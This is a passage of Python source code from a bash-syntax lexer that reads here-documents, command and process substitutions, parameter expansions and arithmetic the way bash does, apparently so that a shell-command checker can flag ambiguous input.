                    self._cut(cast(_Word, w), start - 2)
                    continue
                self._nested()
                src = self._source(start, max(start, self.i - 1))
                self.subs.append(_OutSub(src) if ch == ">" else src)
                w.text += "<(..)"
                w.dynamic = w.started = True
            elif ch in "<>" or (ch == "&" and nxt == ">"):
                op_at = self.i
                # an fd number, or `{name}` (bash 4.1+ gives it a new descriptor, #328), belongs to the operator
                if w.started and not w.quoted and (w.text.isdigit()
                        or re.fullmatch(r"\{[A-Za-z_]\w*\}", cast(_Word, w).text)):
                    state["w"], start, fd = _Word(), -1, cast(_Word, w).text
                    op_at = w_at
                else:
                    flush()
                op = next(o for o in _REDIR_OPS if s.startswith(o, self.i))
                self.i += len(op)
                if op in ("<<", "<<-"):
                    state["delim"], hd_at = op == "<<-", op_at
                else:
                    toks.append(("redir", op))
                    mark(op_at, self.i)
            elif ch in ";&|()":
                flush()
                if ch == ")" and closer and depth == 0:
                    self.i += 1
                    return toks
                op = next(o for o in _CTRL_OPS if s.startswith(o, self.i))
                depth += {"(": 1, ")": -1}.get(op, 0)
                toks.append(("op", op))
                mark(self.i, self.i + len(op))
                self.i += len(op)
            else:
                if ch in "*?" or (ch in "[{" and w.started):
                    w.glob = True
                if ch == "{" and isinstance(w, _Word):
                    w.brace = True
                w.text += ch
                w.started = True
                self.i += 1
        flush()
        self.marks, self.met = marks or [], met
        self.ran_out = self.ran_out or closer
        return toks

    def _read_heredocs(self, closer: bool = False) -> None:
        while self.pending:
            hd = self.pending.pop(0)
            first = self.i
            self.i, last = _heredoc_body(self.s, self.i, hd, closer)
            if not hd.quoted:
                w = _Word()
                sub = _Lexer(hd.body, scan=False, nest=self.nest)
                sub.part = self.part
                sub._dquote(w, until_end=True)
                hd.prompt = w.prompt              # a ${..@P} in the body expands as the body is made (#579)
                self.subs += sub.subs
                self.differs = self.differs or sub.differs
                if sub.cuts:                   # the levels around hold a stand-in for the body, as for a cut
                    self.cuts.append((first, last, "$(" + _TOO_DEEP + ")\n"))
            if hd.cut and last < len(self.s):  # and its end line as they spell the delimiter, so the two still pair
                at = self.s.find(hd.delim, last)
                self.cuts.append((at, at + len(hd.delim), hd.cut))

    def _dquote(self, w: _Word, until_end: bool = False) -> None:
        s = self.s
        w.quoted = w.started = True
        while self.i < len(s):
            ch, nxt = s[self.i], s[self.i + 1:self.i + 2]
            if ch == '"' and not until_end:
                self.i += 1
                return
            if ch == "\\" and nxt and nxt in '$`"\\\n':
                if nxt != "\n":
                    w.text += nxt
                self.i += 2
            elif ch == "$":
                self._dollar(w, double=True)
            elif ch == "`":
                self._backtick(w, double=True)
            else:
                w.text += ch
                self.i += 1
        self.left_open = self.left_open or not until_end

    def _nested(self) -> list:
        """run() for the $( ) or <( ) whose text starts at i, one level deeper. With bash, a here-doc opened in it is
        its own, as in bash's parser: one left open at its `)` takes no line after it, and one from the line around
        it waits for that line's newline, not one inside the part (#143). The reading before shares them."""
        start, outer = self.i, self.pending
        if self.bash:
            self.pending = []
        self.nest += 1
        toks = self.run(closer=True)
        self.nest -= 1
        if self.bash:
            if self.pending or (outer and "\n" in self.s[start:self.i]):
                self._differ()
            self.pending = outer
        return toks

    def _procsub(self, w: _Word) -> None:
        """<( ) or >( ) at i, as run() reads one at the start of a word (for the scans that read text again)."""
        if self.nest >= _NEST:
            self._cut(w, self.i)
            return
        out = self.s[self.i:self.i + 1] == ">"
        self.i += 2
        start = self.i
        self._nested()
        src = self._source(start, max(start, self.i - 1))
        self.subs.append(_OutSub(src) if out else src)
        w.text += "<(..)"
        w.dynamic = w.started = True

    def _backtick(self, w: _Word, double: bool = False, at: int = -1) -> None:
        """A backquote at i. One in a ${..} word (``at``: the level of its text, _deeper) or in a part only bash's
        reading opens is a level of that part (#143): its text is read at its level, and its source lists each part
        past the cap in it as a stand-in, which the levels around spell too (_part)."""
        s, j, out = self.s, self.i + 1, []
        while j < len(s) and s[j] != "`":
            if s[j] == "\\" and j + 1 < len(s):
                out.append(s[j + 1])
                j += 2
                continue
            out.append(s[j])
            j += 1
        inner = src = "".join(out)
        if (at >= 0 or self.part) and j < len(s) and ("(" in inner or "`" in inner):
            lx = self._part(inner, at if at >= 0 else self.nest + 1, spend=at >= 0)
            if lx is None:
                src = _TOO_DEEP
                self.cuts.append((self.i, j + 1, "$(" + _TOO_DEEP + ")"))
            else:
                lx.run()
                if lx.cuts:
                    src = lx._source(0, len(inner))
                    self.cuts.append((self.i, j + 1, "`" + src.replace("\\", "\\\\").replace("`", "\\`") + "`"))
        self.subs.append(src)
        self.i = j + 1
        w.text += "`" + inner + "`"
        w.dynamic = w.started = True
        w.split = w.split or not double

    def _arith(self, i: int) -> int:
        """Where the $(( at s[i] ends when it is arithmetic, else -1. With bash off it is main's reading (#553,
        _dollar_paren): arithmetic to the `))` bash's own scan finds, a $( ) holding a subshell when the text there
        does not balance (-1, read as any $( ) is), and arithmetic text to the end when no `)` closes it. bash
        matches the group as its parser matches one (_arith_end), and reads it as arithmetic only when the text
        between its `$(` and that `)` is one group that balances (_is_arith); else it is a $( ) that holds a
        subshell, read as one (_group_sub). One bash never closes it rejects, and nothing on the line runs: an odd
        part that takes the rest of the text. Where main's reading may end it elsewhere, or read it as the other
        form, the reading before is kept beside (_differ), so main's reading of it is never lost."""
        s = self.s
        if not self.bash:
            return _dollar_paren(s, i) or -1
        end = _arith_group(s, i, self.ends)
        if end >= 0:
            if _hides_paren(s, i, end) or _dollar_paren(s, i) != end:   # the reading before may end it elsewhere
                self._differ()
            return end
        if _arith_end(s, i, self.ends) < 0:
            self._odd()
        self._differ()
        return -1

    def _arith_parts(self, i: int, j: int, word: bool = False, legacy: bool = False) -> None:
        """The $( ) and backquotes in the arithmetic s[i:j], a $(( )) or bash's legacy `$[ ]` (``legacy``, #588),
        listed as sources (cut past _NEST). Its lexer reads the text up to the closing `))` (or `]`) in place, so the
        group ends _arith_end found hold for it too. One in a ${..} word (``word``) is a part only bash's reading
        opens, whose first $( or backquote is its level 1."""
        at, end = (i + 2, j - 1) if legacy else (i + 3, j - 2)   # where the body bash reads starts and ends
        body = "$((" + self.s[i + 2:j] + "))" if legacy else self.s[i:j]
        sub = None
        if self.nest < _NEST and ("$(" in body[3:] or "`" in body):
            # main reads a legacy body to the end of its span, its `]` too, also when no `]` closes it (#588)
            text = self.s[:max(at, j if legacy else end)]
            sub = self._part(text, self._deeper() - 1) if word else _Lexer(text, scan=False, nest=self.nest + 1)
        if sub is None and (self.nest >= _NEST or word) and (_SUBST.search(body, 3) or "`" in body):
            self.cuts.append((at, max(at, end), "$(" + _TOO_DEEP + ")"))
            self.subs.append(_TOO_DEEP)
        elif sub is not None:
            sub.i, sub.ends, sub.part = at, self.ends, sub.part or self.part
            sub._dquote(_Word(), until_end=True)
            self.subs += sub.subs
            self.cuts += sub.cuts
            self.differs = self.differs or sub.differs

    def _param(self, i: int, dq: bool, first: int, prompts: set[int] | None = None) -> int:
        """bash's reading of the ${..} word at s[i] (#143), where the reading before #143 ends it at its first }
        (``first``): the index of the } that closes it, or len(s) - 1 when none does (bash rejects the line: an odd
        part). Only a } outside quotes and escapes closes it. A ' pairs with the next one, in double quotes (``dq``)
        too; $'..' ends at its first ' that is not escaped; in a ".." inside the word a ' is text. A nested ${ opens
        a level on a stack, not a recursion, so a nest of any depth is read in one pass. Each $( ), $(( and
        backquote in the word, and each <( ) and >( ) outside double quotes, is read as one elsewhere and its source
        listed (_param_part). Single-quoted text bash expands (in double quotes after an operator other than
        _DQ_QUOTING_OP's: `"${a:-'$(cmd)'}"`) is read within that text alone, so nothing opened in it runs past its
        quote (_quoted_span). A ${ that runs a value (_RUNS_VALUE) is an odd part, but for a ${..@P} the word's own
        reading weighs (``prompts``, where each starts): main's #579 reading asks for it unless the line assigns
        its parameter a literal value."""
        s, n = self.s, len(self.s)
        prompts = prompts or set()
        # per open ${: [in a ".." inside it, '..' expands, in double quotes]
        stack = [self._param_open(i, dq, i in prompts)]
        j = _joins_past(s, i + 1) + 1          # past its {, a \<newline> before it dropped (#585)
        while (m := _PARAM_STOP.search(s, j)) is not None:
            j, ch = m.start(), m.group()
            inq, sq, fdq = stack[-1]
            if ch == "\\":
                j += 2
            elif (ch == "'" or s.startswith("$'", j)) and not inq:
                a = j + 1 if ch == "'" else j + 2
                j = _skip(s, a, "'", ch != "'")
                if sq:
                    self._quoted_span(a, j - 1 if s[j - 1:j] == "'" and j > a else j)
            elif ch == "`":
                self.i = j
                self._backtick(_Word(), at=self._deeper())
                j = self.i
                self._differ()
                if j > n:                   # it runs out, so the word never closes and asks: its text is not read
                    self.subs.pop()
            elif s.startswith("$(", j) or (ch in "<>" and s.startswith("(", j + 1) and not (fdq or inq)):
                j = self._param_part(j)
            elif s.startswith("${", j):
                stack.append(self._param_open(j, fdq or inq, j in prompts))
                j += 2
            elif ch == "}" and not inq:
                stack.pop()
                if not stack:
                    if j != first:
                        self._differ()
                    return j
                j += 1
            else:
                if ch == '"':
                    stack[-1][0] = not inq
                j += 1
        self._odd()
        return n - 1

    def _param_open(self, at: int, dq: bool, prompt: bool = False) -> list:
        """A level of _param's stack for the ${ at s[at]. One that runs a value is an odd part, and so are bash
        5.3's `${ cmd; }` and `${| cmd; }`, which run cmd: its text to the first } is listed as a source too, when
        a } closes it and it holds no other. That text is a part only bash's reading opens (_part), whose first $( or
        backquote is its level 1, as _param reads the $( ) in it as parts of the word. A ${..@P} the word itself
        lists (``prompt``, _Word.prompt) is weighed as main weighs it (#579, _runs_prompt): an opaque part unless the
        line assigns its parameter a literal value."""
        s = self.s
        b = _joins_past(s, at + 1) + 1         # past its {, a \<newline> before it dropped (#585)
        if _RUNS_VALUE.match(s, b) and not prompt:
            self._odd()
        elif s[b:b + 1] in (" ", "\t", "\n", "|"):
            if self.brace_at < at:                   # else the text listed for one before holds this one
                end = s.find("}", at)
                self.brace_at = len(s) if end < 0 else end
                # one bash never closes runs nothing; one holding another is not read again at each level (asks)
                if end >= 0 and not _FUNSUB.search(s, b, end):
                    lx = self._part(s[:end], self._deeper() - 1)
                    if lx is not None:
                        lx.i = b
                        lx.run()
                    self.subs.append(_TOO_DEEP if lx is None else lx._source(b, end).lstrip("|"))
            self._odd()
        return [False, dq and not _DQ_QUOTING_OP.match(s, b), dq]

    def _group_sub(self, i: int, end: int) -> None:
        """The $(( at s[i] that bash runs as a $( ) holding a subshell (_arith): its text up to the ) where bash's parser
        ends the word (end) is read by a lexer of its own, which goes no further, and listed as a source."""
        lx = self._part(self.s[:end - 1], self._deeper())
        if lx is None:
            self.cuts.append((i, end, "$(" + _TOO_DEEP + ")"))
            self.subs.append(_TOO_DEEP)
            return
        lx.i = i + 2
        lx.run()
        self.subs.append(lx._source(i + 2, end - 1))      # the parts in it are listed when it is read
        self.cuts += lx.cuts

    def _param_part(self, j: int) -> int:
        """The $( ), $(( or <( ) at s[j] in a ${..} word (_param), read by a lexer of its own, as one elsewhere on the
        line: a here-document opened in it stays in it, as in bash. Returns where it ends."""
        s = self.s
        if s.startswith("$((", j) and (end := self._arith(j)) >= 0:
            self._arith_parts(j, end, word=True)
            return end
        self._differ()
        if s.startswith("$((", j):
            if (end := _arith_end(s, j, self.ends)) >= 0:
                self._group_sub(j, end)
                return end
            return len(s)                           # one bash never closes takes the rest of the text and asks
        lx = self._part(s, self._deeper())
        if lx is None:
            end = _nest_end(s, j + 2, [])[0]
            if end >= len(s) and (end > len(s) or _nest_end(s + "\n", j + 2, [])[0] > len(s)):
                return len(s)                       # it runs out (as below)
            self.cuts.append((j, end, s[j] + "(" + _TOO_DEEP + ")"))
            self.subs.append(_TOO_DEEP)
            return end
        lx.i = j + 2
        lx.run(closer=True)
        if lx.ran_out:
            return len(s)             # it runs out, so the word never closes and asks; the reading before stands in
        src = lx._source(j + 2, max(j + 2, lx.i - 1))
        # the parts in it are listed when its source is read, a level deeper (each level of a nest only bash's
        # reading opens is classified once per level above it, not once more at the top)
        self.subs.append(_OutSub(src) if s[j] == ">" else src)
        self.cuts += lx.cuts
        return lx.i

    def _quoted_span(self, a: int, b: int) -> None:
        """Single-quoted text s[a:b] in a ${..} word that bash expands as double-quoted text (_param): its $( ),
        backquotes and ${..} are read within it alone."""
        seg = self.s[a:b]
        if "$" not in seg and "`" not in seg:
            return
        sub = self._part(seg, self._deeper() - 1, spend="(" in seg or "`" in seg) if self.nest < _NEST else None
        if sub is None:
            if "$(" in seg or "`" in seg:
                self.subs.append(_TOO_DEEP)
                self._differ()
            return
        sub._dquote(_Word(), until_end=True)
        if sub.subs or sub.differs:
            self.subs += sub.subs
            self.cuts += [(x + a, y + a, stand_in) for x, y, stand_in in sub.cuts]
            self._differ()

    def _dollar(self, w: _Word, double: bool = False) -> None:
        s, i = self.s, self.i
        k = _joins_past(s, i + 1)   # bash drops a \<newline> before it reads what follows the $ (#585)
        nxt = s[k:k + 1]
        w.started = True
        legacy = s.startswith("$[", i)     # bash's legacy arithmetic (#588): read it as the $((..)) it stands for
        if legacy:
            depth, j = 0, i + 1
            pair = {"[": 1, "]": -1}.get
            while j < len(s):
                depth += pair(s[j], 0)
                j += 1
                if depth == 0:
                    break
        elif s.startswith("$((", i):
            j = self._arith(i)             # -1 when bash runs the span as a $( ( ) command substitution (#553)
        else:
            j = -1
        if j >= 0:
            body = "$((" + s[i + 2:j] + "))" if legacy else s[i:j]   # the span to what bash's own scan finds (#553)
            if legacy:
                w.legacy = True
            self._arith_parts(i, j, legacy=legacy)
            if self.scan and i >= self.covered:
                w.exps.append((body, body, None))
            w.text += s[i:j]               # as written, `$[..]`, so the word keeps its own spelling
            w.dynamic = True
            w.split = w.split or not double
            self.i = j
        elif nxt == "(" and self.bash and s.startswith("$((", i):
            j = _arith_end(s, i, self.ends)
            if j >= 0:
                self._group_sub(i, j)      # bash runs it as a $( ) holding a subshell (#553)
            else:                          # one bash never closes takes the rest of the text and asks (_arith)
                j = len(s)
            w.text += s[i:j]
            w.dynamic = True
            w.split = w.split or not double
            self.i = j
        elif nxt == "(":
            if self.nest >= _NEST:
                self._cut(w, i)
                return
            self.i = k + 1
            start = self.i
            toks = self._nested()
            inner = s[start:max(start, self.i - 1)]
            lit = _literal_heredoc(toks)
            w.split = w.split or not double                  # bash splits its output outside double quotes
            if lit is not None:
                w.text += lit          # $(cat <<'EOF' ... EOF) is plain text
            else:
                self.subs.append(self._source(start, max(start, self.i - 1)))
                w.text += "$(" + inner + ")"
                w.dynamic = True
        elif nxt == "{":
            j = s.find("}", i)
            j = len(s) - 1 if j < 0 else j
            prompts: set[int] = set()      # where a ${..@P} main's reading weighs starts (#579, _Lexer._param)
            if k > i + 1:                # a ${ the \<newline> splits: bash still runs the $( ) and ` ` in it (#585)
                sub = _Lexer(s[k:j + 1], scan=False, nest=self.nest)
                sub._dquote(_Word(), until_end=True)
                self.subs += sub.subs
            if self.scan and i >= self.covered:    # what bash reads: it may run past this first }
                vis, close, frames = _dollar_brace(s, i, double, self.nest)
                rel = {at - i: [end - i, None if up is None else up - i] for at, (end, up) in frames.items()}
                w.exps.append((vis, s[i:close + 1], rel))
                self.covered = close + 1
                for at, (end, _) in rel.items():   # the outer ${ and every one nested in it
                    if m := _RUNS_PROMPT.fullmatch(s[i + at:i + end + 1]):
                        w.prompt.append(m[1])      # a value bash runs as a prompt string (#579)
                        prompts.add(i + at)
            elif m := _RUNS_PROMPT.fullmatch(s[i:j + 1]):
                w.prompt.append(m[1])
                prompts.add(i)
            if self.bash:
                if k > i + 1:              # the reading before reads such a ${ to its first } as text bash runs
                    self._differ()         # (#585), which bash's reading of the word may not: it is kept beside
                j = self._param(i, double, j, prompts)
            w.text += s[i:j + 1]
            w.dynamic = True
            # "${name[@]}", "${!name@}" and "${@:2}" make several words. bash may read past the first } when a
            # quote, a backtick, a backslash or a $( comes before it, and the lexer cannot tell what is quoted after.
            w.split = w.split or not double or "@" in s[i:j + 1] or bool(re.search(r"[\"'`\\]|\$\(", s[i + 2:j]))
            self.i = j + 1
        elif nxt == "'" and double and self.bash:  # in double quotes bash reads `$'` as a $ and a quote (#143)
            self._differ()
            w.text += "$"
            self.i = i + 1
        elif nxt == "'":                       # $'..' (ANSI-C quoting): decode the escapes
            j, out = k + 1, []
            while j < len(s) and s[j] != "'":
                step = 2 if s[j] == "\\" else 1
                out.append(s[j:j + step])
                j += step
            self.left_open = self.left_open or j >= len(s)
            raw = "".join(out)
            try:
                w.text += _ansi_c(raw)
            except (UnicodeError, ValueError):
                w.text += raw
                w.dynamic = True
            w.quoted = w.dollar_quote = True
            self.i = j + 1
        elif nxt == '"' and not double:        # $".." (locale quoting): the string itself, without the $
            self.i = k + 1
            w.locale = w.locale or s[k + 1:k + 2] != '"'     # bash never translates an empty $""
            w.dollar_quote = True
            self._dquote(w)
        else:
            m = re.match(r"([A-Za-z_]\w*|[0-9@*#?$!-])", s[k:])
            if m:
                w.text += "$" + m.group(1)
                w.dynamic = True
                w.split = w.split or not double or m.group(1) == "@"
                self.i = k + len(m.group(1))
            else:
                w.text += "$"
                self.i = i + 1


def _heredoc_body(s: str, i: int, hd: _Heredoc, closer: bool = False) -> tuple[int, int]:
    """Read the body of ``hd`` from s[i] on, as bash ends it: at a line that is its delimiter. Sets hd.body and
    returns where the lexer goes on and where the line that ended the body starts (len(s) when none did)."""
    start = len(s)
    lines: list[str] = []
    found = False
    while i < len(s):
        j = s.find("\n", i)
        end = len(s) if j < 0 else j
        line, start = s[i:end], i
        i = len(s) if j < 0 else j + 1
        cand = line.lstrip("\t") if hd.strip else line   # bash drops leading tabs for <<- here too
        if cand == hd.delim:
            # bash ends the body on the line that equals the delimiter exactly (#328). The delimiter
            # is the word after quote removal, so a space, tab or other character in it (`EOF `, ` EOF`,
            # `EOF\ `, `E"O"F`) is part of it: `cat <<'EOF '` ends on `EOF `, never on bare `EOF`.
            found = True
            break
        if closer and cand.startswith(hd.delim) and ")" in cand[len(hd.delim):] \
                and cand[len(hd.delim):].strip(" )") == "":
            i = start + line.index(")", line.index(hd.delim))  # `EOF)` closes a $( ) too
            found = True
            break
        if cand.strip() == hd.delim.strip():
            # the line ends the body only once surrounding whitespace is dropped (a trailing CR, stray
            # spaces, a tab, or dash's rules for a $'..'/$".." delimiter): bash may end elsewhere, so
            # fail closed -- keep reading to the exact terminator and read the whole body as commands too.
            hd.ambiguous = True
        lines.append(line.lstrip("\t") if hd.strip else line)
    hd.body = "\n".join(lines)
    if not found:
        start = len(s)
        hd.ambiguous = True   # no terminator at all: fail closed and read the body as commands (#328)
    return i, start

# For _nest_end: runs of characters an unquoted word and double-quoted text take as they stand, a backquoted body, a
# variable reference, and the longest here-doc delimiter it keeps (a longer one ends no body, so the rest is unread).
_WORD_RUN = re.compile(r"[^ \t\r\n\\'\"`$<>&;|()#]+")
_DQ_RUN = re.compile(r"[^\"\\$`]+")
_BT_BODY = re.compile(r"(?:[^`\\]|\\.)*", re.S)
_ANSI_BODY = re.compile(r"(?:[^'\\]|\\.)*", re.S)
_BRACKETS = re.compile(r"[\[\]]")
_VAR_REF = re.compile(r"\$(?:[A-Za-z_]\w*|[0-9@*#?$!-])")
_SUBST = re.compile(r"\$\((?!\()")          # a $( that is not $((
_HIDES_PAREN = re.compile(r"[\"'`\\#]")     # what bash's $(( matching steps over and a count of every ( does not
_MAY_DIFFER = re.compile(r"\$[{']|\$\(\(|<<")   # what _nest_end reads otherwise with bash on (_Lexer._cut)
_GROUP_STOP = re.compile(r"[\\`$\"'#(){}]")   # what _group_end and _expand_end read; the rest they step over
_ARITH_STOP = re.compile(r"[\\'\"$()]")       # what _is_arith reads
_PARAM_STOP = re.compile(r"[\\'\"`$<>}]")     # what _Lexer._param reads
_COMMENT_OR_HEREDOC = re.compile(r"(?:^|(?<=[\s;&|()]))#|<<")
_DELIM_MAX = 1024


def _match_end(rx: re.Pattern[str], s: str, i: int) -> int:
    m = rx.match(s, i)
    return m.end() if m else i


class _Open:
    """For _nest_end: a part it is inside. A $( ) or <( ) holds commands, read as run() reads them, with the state
    of its current word (`text` collects it when it will be a here-doc delimiter). Double-quoted text belongs to the
    word of the part below it (`owner`). A ${..} word (`{`, #143) is read as _Lexer._param reads it."""
    __slots__ = ("kind", "start", "owner", "depth", "delim", "started", "digits", "quoted", "dollar", "text", "size",
                 "over", "pend", "dq", "inq")

    def __init__(self, kind: str, start: int = 0, owner: _Open | None = None):
        self.kind, self.start, self.owner, self.depth = kind, start, owner, 0
        self.delim: bool | None = None           # a << before the word (True for <<-): it is a delimiter
        self.pend: list[_Heredoc] = []           # the here-docs waiting for its newline (with bash, its own)
        self.dq = self.inq = False               # a ${..} word: in double quotes, in a ".." inside it
        self.new_word()

    def new_word(self) -> None:
        self.started, self.digits, self.quoted, self.dollar, self.size, self.over = False, True, False, False, 0, False
        self.text: list[str] | None = [] if self.delim is not None else None

    def add(self, s: str, a: int, b: int, wrap: str = "") -> None:
        """Add s[a:b] to a delimiter's text, inside `wrap` (`$(` and `)`) when given, unless it grows past
        _DELIM_MAX."""
        if self.text is None or self.over:
            return
        size = self.size + max(0, min(b, len(s)) - a) + len(wrap)
        if size > _DELIM_MAX:
            self.over, self.text = True, []
        else:
            self.text.append(wrap[:2] + s[a:b] + wrap[2:])
            self.size = size


def _nest_end(s: str, i: int, pending: list[_Heredoc]) -> tuple[int, list[_Heredoc]]:
    """Where the $( ) or <( ) whose text starts at s[i] ends, as _Lexer.run ends it (#334): just past its closing `)`,
    or at the end of s when none closes it. The text is read as the lexer reads it (quotes, comments, backquotes, the
    $ forms, redirections and here-documents), but only to find that end: one pass, with a stack of the open parts in
    place of the lexer's recursion, and no here-doc body read again. ``pending`` is the lexer's list of here-docs
    waiting for a newline: a body read here leaves it, and a here-doc opened here whose body comes later joins it.
    Also returns the here-docs from before the cut whose body was read here. A ${..} word and a $(( are read as the
    lexer reads them (#143, #553): with bash off as before, else as _Lexer._param and _Lexer._arith read them, and a
    here-doc opened in a $( ) or <( ) waits in it alone (_Lexer._nested)."""
    n, before = len(s), {id(h) for h in pending}
    bash = not _flat_words.get()
    ends: dict[int, int] = {}                    # _arith_end's
    read: list[_Heredoc] = []
    stack = [_Open("$", i)]
    stack[0].pend = pending

    def push(kind: str, at: int = 0, owner: _Open | None = None, dq: bool = False) -> None:
        f = _Open(kind, at, owner)
        f.pend = [] if bash and kind != '"' else stack[-1].pend      # as _Lexer._nested
        f.dq = dq
        stack.append(f)

    def flush(f: _Open) -> None:                 # as run()'s flush: a started word after << is a delimiter
        if f.started and f.delim is not None:
            delim = "\n" if f.over else "".join(f.text or [])     # no body line is "\n": the body runs to the end
            f.pend.append(_Heredoc(delim, f.delim, f.quoted, f.dollar))
            f.delim = None
        f.new_word()

    def close(f: _Open, i: int) -> None:         # the part ends at i; its text goes into the word around it
        stack.pop()
        if f.kind != '"' and stack:
            w = stack[-1].owner or stack[-1]
            w.started, w.digits = True, False
            if f.kind == "<":
                w.add("<(..)", 0, 5)
            elif f.kind == "{":
                w.add(s, f.start - 2, i)
            else:
                w.add(s, f.start, max(f.start, i - 1), "$()")

    def arith(i: int) -> int:                    # where a $(( ends, as _Lexer reads it (_arith, _group_sub)
        if bash:                                 # with bash, one that never closes takes the rest of the text
            j = _arith_end(s, i, ends)
            return n if j < 0 else j
        return _dollar_paren(s, i)               # main's (#553): 0 when it is a $( ) holding a subshell

    def dollar(w: _Open, i: int, double: bool) -> int:     # as _Lexer._dollar
        k = _joins_past(s, i + 1)    # bash drops a \<newline> before it reads what follows the $ (#585)
        nxt = s[k:k + 1]
        w.started, w.digits = True, False
        if s.startswith("$((", i) and (j := arith(i)):
            w.add(s, i, j)
            return j
        if nxt == "[":                         # bash's legacy arithmetic (#588), read to its `]` as $(( )) to `))`
            depth, j = 0, n
            for m in _BRACKETS.finditer(s, i + 1):
                depth += 1 if m.group() == "[" else -1
                if depth == 0:
                    j = m.end()
                    break
            w.add(s, i, j)
            return j
        if nxt == "(":
            push("$", k + 1)
            return k + 1
        if nxt == "{" and bash:
            push("{", k + 1, dq=double)
            return k + 1
        if nxt == "{":
            j = s.find("}", i)
            j = n - 1 if j < 0 else j
            w.add(s, i, j + 1)
            return j + 1
        if nxt == "'" and not (double and bash):
            j = _match_end(_ANSI_BODY, s, k + 1)
            j = n + 1 if j < n and s[j] == "\\" else j          # a backslash that ends s takes one more step
            w.quoted = w.dollar = True
            if w.text is not None:
                try:
                    text = _ansi_c(s[k + 1:j])
                except (UnicodeError, ValueError):
                    text = s[k + 1:j]
                w.add(text, 0, len(text))
            return j + 1
        if nxt == '"' and not double:
            w.quoted = w.dollar = True
            push('"', owner=w)
            return k + 1
        parameter = re.match(r"[A-Za-z_]\w*|[0-9@*#?$!-]", s[k:])
        if parameter:
            j = k + len(parameter.group(0))
            w.add("$" + parameter.group(0), 0, 1 + len(parameter.group(0)))
        else:
            j = i + 1
            w.add(s, i, j)
        return j

    def backtick(w: _Open, i: int) -> int:       # as _Lexer._backtick
        j = _match_end(_BT_BODY, s, i + 1)
        j = n if j < n and s[j] == "\\" else j
        w.started, w.digits = True, False
        if w.text is not None:
            text = "`" + re.sub(r"\\(.)", r"\1", s[i + 1:j], flags=re.S) + "`"
            w.add(text, 0, len(text))
        return j + 1

    while True:
        f = stack[-1]
        if i >= n:                               # the line ends: each open part ends as run() ends it
            if any(o.kind == "{" for o in stack):
                i = n                            # _Lexer._param ends a word left open at the end, wherever inside it
            while stack:
                if stack[-1].kind != '"':
                    flush(stack[-1])
                close(stack[-1], i)
            return i, read
        ch, nxt = s[i], s[i + 1:i + 2]
        if f.kind == "{":                        # a ${..} word, as _Lexer._param reads it
            if ch == "\\":
                i += 2
            elif (ch == "'" or s.startswith("$'", i)) and not f.inq:
                i = _skip(s, i + 1 if ch == "'" else i + 2, "'", ch != "'")
            elif ch == "`":
                i = backtick(f, i)
            elif s.startswith("$((", i):
                i = arith(i)                     # with bash on, as here, it ends where the parser ends it
            elif s.startswith("$(", i) or (ch in "<>" and nxt == "(" and not (f.dq or f.inq)):
                push("<" if ch in "<>" else "$", i + 2)
                i += 2
            elif s.startswith("${", i):
                push("{", i + 2, dq=f.dq or f.inq)
                i += 2
            elif ch == "}" and not f.inq:
                i += 1
                close(f, i)
            else:
                f.inq = f.inq != (ch == '"')
                i += 1
        elif f.owner is not None:                # in double quotes, as _Lexer._dquote
            if ch == '"':
                stack.pop()
                i += 1
            elif ch == "\\" and nxt and nxt in '$`"\\\n':
                f.owner.add(nxt, 0, 0 if nxt == "\n" else 1)
                i += 2
            elif ch == "$":
                i = dollar(f.owner, i, True)
            elif ch == "`":
                i = backtick(f.owner, i)
            else:
                j = max(_match_end(_DQ_RUN, s, i), i + 1)
                f.owner.add(s, i, j)
                i = j
        elif ch in " \t" or (ch == "\r" and f.delim is None):
            flush(f)
            i += 1
        elif ch == "\n":
            flush(f)
            i += 1
            while f.pend:
                hd = f.pend.pop(0)
                i = _heredoc_body(s, i, hd, closer=True)[0]
                if id(hd) in before:
                    read.append(hd)
        elif ch == "#" and not f.started:
            j = s.find("\n", i)
            i = n if j < 0 else j
        elif ch == "\\":
            if nxt != "\n":
                f.started, f.quoted, f.digits = True, True, False
                f.add(nxt, 0, 1)
            i += 2
        elif ch == "'":
            j = s.find("'", i + 1)
            j = n if j < 0 else j
            f.started, f.quoted, f.digits = True, True, False
            f.add(s, i + 1, j)
            i = j + 1
        elif ch == '"':
            f.started, f.quoted, f.digits = True, True, False
            push('"', owner=f)
            i += 1
        elif ch == "`":
            i = backtick(f, i)
        elif ch == "$":
            i = dollar(f, i, False)
        elif ch in "<>" and nxt == "(" and not f.started:
            push("<", i + 2)
            i += 2
        elif ch in "<>" or (ch == "&" and nxt == ">"):
            if f.started and f.digits:           # an fd number belongs to the operator
                f.new_word()
            else:
                flush(f)
            op = next(o for o in _REDIR_OPS if s.startswith(o, i))
            i += len(op)
            if op in ("<<", "<<-"):
                f.delim = op == "<<-"
                f.new_word()
        elif ch in ";&|()":
            flush(f)
            if ch == ")" and f.depth == 0:
                i += 1
                close(f, i)
                if not stack:
                    return i, read
            else:
                op = next(o for o in _CTRL_OPS if s.startswith(o, i))
                f.depth += {"(": 1, ")": -1}.get(op, 0)
                i += len(op)
        else:
            j = max(_match_end(_WORD_RUN, s, i), i + 1)   # `#` in a started word is text too
            f.digits = f.digits and s[i:j].isdigit()
            f.started = True
            f.add(s, i, j)
            i = j


def _skip(s: str, k: int, closer: str, escapes: bool) -> int:
    """The index just past the first `closer` from s[k] on, or len(s). With `escapes`, a backslash hides
    the next character."""
    while k < len(s) and s[k] != closer:
        k += 2 if escapes and s[k] == "\\" else 1
    return min(k + 1, len(s))


def _group_end(s: str, k: int, kind: str, ends: dict[int, int] | None = None) -> int:
    """Where bash's parser ends the part that starts at s[k] (#553), or -1 when none does: a $(( group (`a`, from its
    `(`: just past the `)` that matches it) or a double-quoted string (`d`, from after its quote: just past the one
    that closes it). One pass with a stack of the parts open in it, in place of bash's recursion, from one character
    it reads to the next (_GROUP_STOP). Escapes, '..', $'..' (`\\'` escaped) and backquotes are stepped over; a $( )
    in it is a part (`c`) where a `#` that starts a word starts a comment; a ".." holds $( ), $(( and ${..} (`b`,
    whose quotes pair as in a ${..} word); in a $(( group a ${ is text. ``ends`` keeps the end of each ( a $(( group
    holds, so a chain of them is scanned once and _arith_group reads the first group's end from it."""
    if ends is not None and k in ends:
        return ends[k]
    n = len(s)
    stack: list[list[Any]] = [[kind, [] if kind == "a" else 0, k]]   # per part: [kind, its open ( (a list in `a`;
    while (m := _GROUP_STOP.search(s, k)) is not None:               # in `b`: in a ".."), start]
        k, ch, f = m.start(), m.group(), stack[-1]
        if f[0] == "a" and ch in "()":                                # the most of a dense nest, read first
            k += 1
            if ch == "(":
                f[1].append(k - 1)
            elif f[1]:
                at = f[1].pop()
